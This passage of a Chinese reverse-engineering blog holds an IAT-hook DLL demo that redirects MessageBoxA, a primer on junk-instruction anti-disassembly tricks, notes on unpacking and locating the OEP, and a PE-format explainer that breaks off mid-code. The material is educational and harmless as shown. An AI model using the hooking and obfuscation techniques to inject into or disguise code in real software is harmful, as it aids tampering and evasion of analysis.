class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建与Messagebox相同的函数指针,注意要设置相同的函数参数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI *PfnMsgA)</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="params">_In_opt_ LPCSTR lpText,</span></span><br><span class="line"><span class="params">_In_opt_ LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">_In_ UINT uType)</span>;</span><br><span class="line"></span><br><span class="line">PfnMsgA g_OldPfnMsgA = nullptr;  <span class="comment">//定义一个指向原先messagebox函数的空指针(nullptr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解析PE文件结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前的ImagBase(基址)</span></span><br><span class="line">HMODULE hModImageBase = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//获取DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)(DWORD)hModImageBase; </span><br><span class="line"><span class="comment">//获取NT头</span></span><br><span class="line">DWORD dwTemp = (DWORD)pDosHead + (DWORD)pDosHead-&gt;e_lfanew;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)dwTemp; </span><br><span class="line"><span class="comment">//获取标准PE头</span></span><br><span class="line">PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp; pNtHead-&gt;FileHeader;  </span><br><span class="line"><span class="comment">//获取扩展PE头</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp; pNtHead-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//找到导入表的偏移(RVA)</span></span><br><span class="line">DWORD dwExportLocal=pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)GetModuleHandle(<span class="literal">NULL</span>) + dwExportLocal);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义自己设置的Messagebox函数</span></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBox</span><span class="params">(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szHookText[] = <span class="string">&quot;Hook成功&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (g_OldPfnMsgA != nullptr)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//调用原函数</span></span><br><span class="line"><span class="keyword">return</span> g_OldPfnMsgA(hWnd, szHookText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置IATHook</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetIatHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;开始进行HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//定义一个指向hook地址的空指针</span></span><br><span class="line">PVOID pHookAddress = nullptr;  </span><br><span class="line">    <span class="comment">//将要hook的地址指向Messagebox函数</span></span><br><span class="line">pHookAddress = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nullptr == pHookAddress)  </span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(TEXT(<span class="string">&quot;获取函数地址失败&quot;</span>));   </span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;获取函数地址失败HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指向旧函数的指针</span></span><br><span class="line">g_OldPfnMsgA = (PfnMsgA)pHookAddress;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找IAT表的位置.</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pCurrent = pImport;  </span><br><span class="line">    <span class="comment">//导入表的子表,也就是IAT存储函数地址的表</span></span><br><span class="line">DWORD *pFirstThunk; </span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历导入表</span></span><br><span class="line"><span class="keyword">while</span> (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//找到IAT表的偏移地址</span></span><br><span class="line">dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//指向IAT表的指针</span></span><br><span class="line">        pFirstThunk = (DWORD *)dwTemp; </span><br><span class="line"><span class="keyword">while</span> (*pFirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//遍历IAT表里的子表,若指针指向的是旧函数的地址,则将其修改成我们的函数地址</span></span><br><span class="line"><span class="keyword">if</span> (*pFirstThunk == (DWORD)g_OldPfnMsgA)</span><br><span class="line">&#123;</span><br><span class="line">DWORD oldProtected;</span><br><span class="line">                <span class="comment">//设置该内存区域属性为可写可读可执行</span></span><br><span class="line">VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected); </span><br><span class="line">                <span class="comment">//将旧函数地址修改成自己的函数地址</span></span><br><span class="line">dwTemp = (DWORD)MyMessageBox;</span><br><span class="line"><span class="built_in">memcpy</span>(pFirstThunk, (DWORD *)&amp;dwTemp, <span class="number">4</span>); </span><br><span class="line">                <span class="comment">//还原保护属性</span></span><br><span class="line">VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, oldProtected, &amp;oldProtected);</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//遍历IAT表</span></span><br><span class="line">pFirstThunk++; </span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//遍历导入表</span></span><br><span class="line">pCurrent++; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复导入表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">UnIatHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;开始进行HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">PVOID pHookAddress = nullptr;</span><br><span class="line">pHookAddress = MyMessageBox;</span><br><span class="line"><span class="keyword">if</span> (nullptr == pHookAddress)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(TEXT(<span class="string">&quot;获取函数地址失败&quot;</span>));</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;恢复函数地址失败HOOK&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR   pCurrent = pImport;</span><br><span class="line">DWORD* pFirstThunk; <span class="comment">//指向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历导入表</span></span><br><span class="line"><span class="keyword">while</span> (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">pFirstThunk = (DWORD*)dwTemp; </span><br><span class="line">        <span class="comment">//遍历子表</span></span><br><span class="line"><span class="keyword">while</span> (*pFirstThunk != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">            <span class="comment">//如果是我们的函数地址</span></span><br><span class="line"><span class="keyword">if</span> (*pFirstThunk == (DWORD)MyMessageBox) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//找到要修改的导入表了，修改内存保护属性.写入我们新的函数地址.</span></span><br><span class="line">DWORD oldProtected;</span><br><span class="line">VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">dwTemp = (DWORD)GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pFirstThunk, (DWORD*)&amp; dwTemp, <span class="number">4</span>); <span class="comment">//将变量中保存的函数地址拷贝到导入表中.</span></span><br><span class="line">VirtualProtect(pFirstThunk, <span class="number">0x1000</span>, oldProtected, &amp;oldProtected);</span><br><span class="line">&#125;</span><br><span class="line">pFirstThunk++; <span class="comment">//继续遍历.</span></span><br><span class="line">&#125;</span><br><span class="line">pCurrent++; <span class="comment">//每次是加一个导入表结构.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">SetIatHook();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hook框架 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花指令初探</title>
      <link href="/2021/10/12/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4--%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2021/10/12/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4--%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>花指令的作用是用来隐藏反汇编后的代码，对于动态调试来说无法隐藏，但是对于静态分析来说就成为必须绕过去的一个问题。</p><span id="more"></span><h2 id="花指令如何实现代码隐藏"><a href="#花指令如何实现代码隐藏" class="headerlink" title="花指令如何实现代码隐藏"></a>花指令如何实现代码隐藏</h2><p>花指令能成功干扰反编译器识别代码，主要是与反编译器的实现技术有关。主流反编译器使用两种方法进行反汇编操作，分别是线性扫描和递归下降。</p><h3 id="线性扫描"><a href="#线性扫描" class="headerlink" title="线性扫描"></a>线性扫描</h3><p>之所以叫线性扫描，就是说像一条线一样从头扫到尾。线性扫描反汇编从一个代码段的第一个字节开始，以线性模式扫描整个代码段，逐条反汇编每条指令，直到完成整个代码段</p><ul><li>优点：能够完全覆盖程序的所有代码段</li><li>缺点：没有考虑到代码中可能混有数据</li></ul><h3 id="递归下降"><a href="#递归下降" class="headerlink" title="递归下降"></a>递归下降</h3><p>递归下降反汇编强调控制流的概念。根据一条指令是否被另一条指令引用来决定是否进行反汇编。</p><ul><li>优点：它具有区分代码与数据的强大能力。作为一种基于控制流的算法，它很少会在反汇编过程中错误地将数据值作为代码处理。</li><li>缺点：它无法处理间接代码路径，如利用指针表来查找目标地址的跳转或调用。</li></ul><p>而花指令就是利用这两种方法的缺点来实现。我觉得大家反编译的工具一般是<code>IDA Pro</code>，在设计这类花指令时要通过构造 <strong>必然条件</strong> 或者 <strong>互补条件</strong>，使得程序在实际执行时绕过垃圾数据，这样不会影响程序正常执行</p><h2 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h2><h3 id="相同目标的跳转指令"><a href="#相同目标的跳转指令" class="headerlink" title="相同目标的跳转指令"></a>相同目标的跳转指令</h3><p>在反汇编过程中遇到 <code>jz</code>（跳转到目标地址为零的情况下执行）和 <code>jnz</code>（跳转到目标地址不为零的情况下执行）指令时，如果它们的目标地址相同，那么程序实际上就是要执行一个无条件跳转，相当于 <code>jmp</code> 指令。然而，<code>IDA Pro</code> 在反汇编时可能会误将 <code>jnz</code> 后面的指令也反汇编出来，尽管实际上这些指令并不会被执行，因为程序在遇到 <code>jnz</code> 指令时已经跳转了。这种情况下，如果后面紧跟着的是一些字节指令（如 <code>call</code> 或 <code>jmp</code> 指令），<code>IDA Pro</code> 可能会将它们错误地解释为与 <code>jnz</code> 相关的指令，导致反汇编结果出现问题。</p><p>例如假设原始机器码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">74 03    ; jz 目标地址为当前地址 + 3</span><br><span class="line">75 01    ; jnz 目标地址为当前地址 + 1</span><br><span class="line">E8 58    ; call 目标地址为当前地址 + 58</span><br><span class="line">C3       ; ret</span><br><span class="line">90 90    ; nop</span><br></pre></td></tr></table></figure><p>这里的call指令即为无用数据，只需要将call指令转为data数据再反编译即可</p><h3 id="固定条件的跳转指令"><a href="#固定条件的跳转指令" class="headerlink" title="固定条件的跳转指令"></a>固定条件的跳转指令</h3><p>当条件满足时，相应的判断语句后面的代码将会执行，而当条件不满足时，与之对应的代码则不会执行。如果设置了一个永真语句，后面的代码一定会执行，若是将要执行的代码后继续跟无条件跳转语句，ida则会识别出错。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">33 C0    ; xor eax, eax</span><br><span class="line">74 01    ; jz 目标地址为当前地址 + 1</span><br><span class="line">E9 58    ; jmp 目标地址为当前地址 + 58</span><br><span class="line">C3       ; ret</span><br></pre></td></tr></table></figure><p>在这个例子中<code>xor</code>结束<code>zf</code>标志位一定会被置1，<code>jz</code>跳转成立，而<code>jmp</code>则不会执行。更改方法是将<code>jmp</code> 这行代码<code>nop</code>或改为data</p><h3 id="函数跳转"><a href="#函数跳转" class="headerlink" title="函数跳转"></a>函数跳转</h3><p>函数调用时将调用指令的下一条指令地址压栈，然后跳转到函数位置执行，相当于：<code>PUSH 下一条指令地址</code>、<code>MOV EIP,函数位置</code>，相应地，函数返回时将函数调用时的压栈地址恢复给EIP，相当于<code>POP EIP</code>。如果破环了其中的堆栈平衡，ida就会报错。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call label;调用label函数</span><br><span class="line">label:;函数体</span><br><span class="line">add [esp],5;栈顶加5</span><br><span class="line">ret;返回</span><br></pre></td></tr></table></figure><p>至于栈顶的返回地址要加多少，这取决于跨过语句的长度。此处构造<code>RET</code>返回的位置和正常<code>RET</code>返回的位置相差5个字节，因此栈顶数据加上5个字节</p>]]></content>
      
      
      <categories>
          
          <category> 代码保护 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>程序加壳与脱壳</title>
      <link href="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/"/>
      <url>/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<p>程序加壳主要分为压缩壳、加密壳，多层壳等等，目的都是为了隐藏程序真正的入口点OEP，防止逆向人员轻松分析程序代码。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>壳最开始的目的是为了让逆向分析人员无法轻易获取程序的入口函数，在静态分析时也能隐藏内部代码，</p><p>属于代码保护技术。</p><h2 id="加壳软件与查壳软件"><a href="#加壳软件与查壳软件" class="headerlink" title="加壳软件与查壳软件"></a>加壳软件与查壳软件</h2><p> 加壳：ASPACK，UPX， PEcompact，PE-PACK； PETITE NEOLITE等</p><p>一般用来加壳的也可以用来脱壳</p><p>查壳： Fi ，GetTyp ，peid ，pe-scan等</p><h2 id="如何识别OEP"><a href="#如何识别OEP" class="headerlink" title="如何识别OEP"></a>如何识别OEP</h2><p>这里只分享笔者遇到过的加壳软件中的OEP特征。</p><ul><li>关键词<code>PUSHAD</code>，将所有寄存器压入栈中，<code>POPAD</code>与<code>PUSHAD</code>相对应，将所有寄存器弹出，一般运行到<code>POPAD</code>说明OEP已经不远了。</li><li>观察地址，一般壳程序的地址比源程序的地址要大，也就是源程序在壳程序的上方，当经过了一个大跳转到达原本调试的地址上方，同时观察到有<code>PUSH EBP</code>等开辟栈帧的语句出现，大概率已经到达了OEP</li></ul><h2 id="脱壳方法"><a href="#脱壳方法" class="headerlink" title="脱壳方法"></a>脱壳方法</h2><p>当遇到无法使用工具帮助我们解决壳时，可以使用手脱方法进行脱壳。加壳相当于在程序外套了另外一层程序，当程序运行起来时壳先获取到程序控制权，将壳程序运行结束（自解密阶段），再接着运行原程序，这时程序就执行到了OEP下，我们可以在这个时机下dump源程序。</p><h3 id="单步跟踪"><a href="#单步跟踪" class="headerlink" title="单步跟踪"></a>单步跟踪</h3><p>这是最笨的方法，在调试器中单步运行，不断单步步入或步过，直到到达OEP当中。</p><h3 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h3><p>原理是利用了程序堆栈平衡。在程序自解密时需要先保存寄存器中的值，会进行压栈操作，而当自解密完成需要还原现场时，会将原来压栈的寄存器都弹出，原程序代码恢复。此时硬件断点触发。然后在程序当前位置，只需要少许单步跟踪，就很容易到达正确的OEP位置。</p><h3 id="关键词搜索"><a href="#关键词搜索" class="headerlink" title="关键词搜索"></a>关键词搜索</h3><p>根据所要脱壳程序的脱壳特征，定位到距离OEP最近的汇编，下断点，再运行程序到OEP之后dump。例如UPX可以定位汇编到popad附近，OEP距离popad的距离很近</p>]]></content>
      
      
      <categories>
          
          <category> 代码保护 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pe文件结构</title>
      <link href="/2021/09/20/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2021/09/20/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>可执行文件是指可以由操作系统直接加载执行的文件，而PE文件是Windows下的可执行文件。我们既然要学习PE文件，了解文件格式就是必须的。我们一般称具有PE结构的文件为PE文件，常见的有EXE、DLL。一个完整的PE文件主要有四部分组成：<strong>DOS头</strong>，<strong>NT头</strong>，<strong>节表</strong>以及<strong>节数据</strong>。</p><span id="more"></span><h2 id="PE文件结构说明"><a href="#PE文件结构说明" class="headerlink" title="PE文件结构说明"></a>PE文件结构说明</h2><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p>DOS头 是用来兼容 MS-DOS 操作系统的，目的是当这个文件在 MS-DOS 上运行时提示一段文字：This program cannot be run in DOS mode. 还有一个目的，就是指明 NT 头在文件中的位置。</p><h3 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h3><p>NT头 包含 windows PE 文件的主要信息，其中包括一个 ‘PE’ 字样的签名，PE文件头（IMAGE_FILE_HEADER）和 PE可选头（IMAGE_OPTIONAL_HEADER32）。</p><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><p>节表是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</p><h3 id="节数据"><a href="#节数据" class="headerlink" title="节数据"></a>节数据</h3><p>每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读&#x2F;执行权限，节的名字和数量可以自己定义。</p><h2 id="DOS头-1"><a href="#DOS头-1" class="headerlink" title="DOS头"></a>DOS头</h2><p>首先看到文件前两个字节<code>4D 5A</code>也就是”MZ”，“MZ”是MS-DOS开发者之一的马克·茨柏克沃斯基（Mark Zbikowski）的姓名首字母缩写。PE文件的第一个字节位于一个传统的MS-DOS头部，叫作IMAGE_DOS_HEADERDOS，主要是为了向后兼容以前的DOS系统，DOS部分可以分为DOS MZ文件头（IMAGE_DOS_HEADER）和DOS块（DOS Stub）。DOS头的总长为0x40h，DOS块总长不定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>在DOS头我们只需要重点关注<code>e_magic</code>和<code>e_lfanew</code>即可。前者就是<code>MZ</code>标识，后者指向PE结构开始的地方。</p><p><img src="https://p.sda1.dev/16/1efecbd8dbe89b2abe8827b55ede1ae4/image.png" class="lazyload" data-srcset="https://p.sda1.dev/16/1efecbd8dbe89b2abe8827b55ede1ae4/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><h2 id="NT头-1"><a href="#NT头-1" class="headerlink" title="NT头"></a>NT头</h2><p>NT头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志是<code>50 40 00 00</code>，也就是PE，我们从结构体的角度看一下PE文件头的详细信息。</p><h3 id="PE文件头标识"><a href="#PE文件头标识" class="headerlink" title="PE文件头标识"></a>PE文件头标识</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature; <span class="comment">//PE文件头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader; <span class="comment">//标准PE头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>这是用来判断是否是一个有效的PE文件的标识</p><p>我们使用十六进制工具载入一个EXE文件查看</p><p><img src="https://p.sda1.dev/16/dbadc1f619f08520cadd5addbd3d9086/image.png" class="lazyload" data-srcset="https://p.sda1.dev/16/dbadc1f619f08520cadd5addbd3d9086/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>在第四排四个字节指向的地址为PE头开始的地方，<code>50 45</code>也就是PE，在PE标识后存在机器码用来标识程序为<code>x64(0x8664)</code>还是<code>x32(0x014C)</code>，例如这里用来展示的文件就是一个64位可执行程序。</p><h3 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h3><p>共有20个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine; <span class="comment">//可以运行在多少位系统中 0代表任意,32位:0x14C,64位:0x8664</span></span><br><span class="line">    WORD    NumberOfSections; <span class="comment">//节的数量</span></span><br><span class="line">    DWORD   TimeDateStamp; <span class="comment">//编译器填写的时间戳</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">//调试相关</span></span><br><span class="line">    DWORD   NumberOfSymbols; <span class="comment">//调试相关</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">//标识扩展PE头大小</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">//文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/30/jPFnH2yRq4TOAdW.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/30/jPFnH2yRq4TOAdW.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240430193851504"></p><h3 id="扩展PE头"><a href="#扩展PE头" class="headerlink" title="扩展PE头"></a>扩展PE头</h3><p>包含以下重要信息</p><ul><li>所有含代码的节的总大小</li><li>所有含已初始化数据的节的总大小</li><li>所有含未初始化数据的节的大小</li><li>程序执行入口RVA</li><li>代码的节的起始RVA</li><li>数据的节的起始RVA</li><li>程序的建议装载地址</li><li>内存中的节的对齐粒度</li><li>文件中的节的对齐粒度</li><li>内存中整个PE映像尺寸</li><li>所有头＋节表的大小</li><li>导出表</li><li>导入表</li><li>资源</li><li>重定位表</li><li>调试信息</li><li>版权信息</li><li>导入函数地址表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 